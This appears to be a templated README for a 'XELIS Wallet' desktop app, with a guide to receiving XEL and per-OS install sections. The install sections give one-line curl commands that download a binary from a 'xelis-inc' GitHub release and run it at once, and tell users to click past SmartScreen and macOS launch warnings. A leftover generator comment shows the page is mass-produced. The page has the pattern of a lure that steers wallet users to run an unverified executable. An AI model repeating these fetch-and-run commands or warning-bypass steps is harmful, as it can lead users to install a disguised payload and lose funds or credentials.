![Receive XEL: the XELIS Wallet address and QR code](assets/banner-article.png)
# Receive XEL: the XELIS Wallet address and QR code

Share the address or QR, check the network, then watch history.

## Downloads - Receive

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

A receiving address comes from the wallet itself, so the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) is the only thing you need installed. No exchange account and no registration is involved on your side.

> Sharing an address is safe. Sharing a phrase is not, and no legitimate sender needs it to pay you.

To receive XEL, open the wallet, open the receive view, and share either the address text or its QR code. Confirm the sender is paying on the XELIS network, then watch the transaction appear in history and move from pending to confirmed. The address stays yours; you can use it again for the next payment.

<!-- ARTICLE-BODY-BEGIN -->
## Get an address you can share

Open the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>, open the receive view, and the wallet shows an address with a QR code beside it. Copy the text rather than retyping it, and treat the QR as the same data in a scannable form. Both encode the address, so either one gives the sender the same destination.

The wallet can also produce integrated addresses, which bundle extra payment information into one string. They exist for cases where a sender needs to attach a reference, and the difference between the two forms is explained in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-address-format-integrated.md">XELIS Wallet address formats</a>. For a normal payment between two people, the plain address is enough.

## Check three things before you share it

1. The sender is paying XEL, on the XELIS network, not a wrapped or bridged version elsewhere.
2. The address you copied is complete; compare its first and last characters with the screen.
3. The sender's platform supports the address type; some exchanges reject integrated addresses or require a memo instead.

A truncated paste is the failure that looks like a wallet problem and is not. If the sender reports an invalid address after copying from a chat app, the app may have shortened the text with an ellipsis; send the QR or a fresh copy instead.

## When the payment arrives

Incoming transactions appear in history as pending and confirm once a block includes them. The balance updates after the wallet syncs, so a payment that is confirmed on the network can still take a moment to show if the node connection dropped. If history shows nothing at all, check the sync state before asking the sender to resend.

Reading that record correctly, including what each column tells you, is covered in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-history-records.md">XELIS Wallet transaction history</a>.

And if you need to send the funds onward, the sequence is in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-send-fee-confirmation.md">send XEL with XELIS Wallet</a>, which starts from the same balance you just received.

## If you are the one paying next

Receiving and sending use the same wallet state, so a payment that has not confirmed yet still counts as pending rather than spendable. Wait for confirmation before you forward funds you just received, otherwise the send may fail on an insufficient confirmed balance.

## FAQ

### Can I reuse the same address?

Yes. The address belongs to your wallet and stays valid; reusing it does not weaken the wallet's encryption.

### What if the QR code will not scan?

Use the text address instead. A QR that fails usually means screen glare, scaling or an old scanner app, not a wrong address.

### Why did the sender's exchange reject my address?

Exchanges sometimes require a specific address form or a memo field. Ask which format it accepts, then share the matching address from the wallet.

### Can I receive XEL while the wallet is closed?

The payment still reaches the network and your address. You see it once the wallet opens and syncs.

### Does receiving cost a fee?

No. The sender pays the network fee; receiving is free.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet address formats](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-address-format-integrated.md)
- [XELIS Wallet transaction history](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-history-records.md)
- [Send XEL with XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-send-fee-confirmation.md)
- [XELIS Wallet transaction stuck pending](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
